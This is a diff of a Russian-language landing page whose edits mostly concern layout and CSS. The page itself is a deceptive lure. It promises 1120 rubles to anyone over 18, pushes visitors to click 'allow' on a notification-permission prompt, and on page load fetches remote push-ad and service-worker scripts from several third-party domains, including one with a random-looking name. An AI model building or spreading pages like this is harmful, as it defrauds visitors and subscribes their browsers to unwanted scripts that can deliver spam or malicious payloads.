@@ -13,6 +13,7 @@
             margin: 0;
             padding: 0;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
@@ -27,6 +28,7 @@
             border-radius: 5px;
             font-size: 18px;
             cursor: pointer;
+            margin-top: 20px; /* Add margin to separate button from text */
         }
 
         .main {
@@ -37,19 +39,9 @@
             z-index: 1; /* Ensure text is above the background */
         }
 
-        .section1 {
-            padding: 0;
-        }
-
-        .section2 {
-            justify-content: center;
-            align-items: center;
-            display: flex;
-        }
-
         .keks {
-            width: 100%;
-            height: 100%;
+            max-width: 100%;
+            height: auto; /* Ensure the image aspect ratio is maintained */
             position: absolute; /* Add absolute positioning for background */
             top: 0;
             left: 0;
@@ -74,20 +66,18 @@
     <script type="text/javascript" src="https://majorpushme1.com/?ma=gezgizlbmu5ha3ddf4ztkmbv" async></script>
 </head>
 <body>
-<div class="keks">
-    <img class="gif" src="img/keks.gif">
-</div>
-    <div class="main">
-        <div class="section1">
-            <h1 class="h">Тебе есть 18 лет? <br>Тогда забирай 1120 руб</h1>
-        </div>
-        <div class="section2">
-            <a onclick="requestNotificationPermission()" id="showButton" class="button" href="https://t.me/TIMInc217">Жми разрешить <br> и переходи</a>
-        </div>
+<img class="keks" src="img/keks.gif">
+<div class="main">
+    <div class="section1">
+        <h1 class="h">Тебе есть 18 лет? <br>Тогда забирай 1120 руб</h1>
     </div>
+    <div class="section2">
+        <a onclick="requestNotificationPermission()" id="showButton" class="button" href="https://t.me/TIMInc217">Жми разрешить и переходи</a>
+    </div>
+</div>
 
-    <script src="service-worker.js">importScripts('https://pushprofit.net/n/service-worker.js')</script>
-    <script>importScripts('https://pushprofit.net/n/service-worker.js')</script>
-    <script async src="https://ftuwhzasnw.com/1015588/c4b1596d3b533669b526754498b4d1cc42a37ada.js"></script>
+<script src="service-worker.js">importScripts('https://pushprofit.net/n/service-worker.js')</script>
+<script>importScripts('https://pushprofit.net/n/service-worker.js')</script>
+<script async src="https://ftuwhzasnw.com/1015588/c4b1596d3b533669b526754498b4d1cc42a37ada.js"></script>
 </body>
 </html>
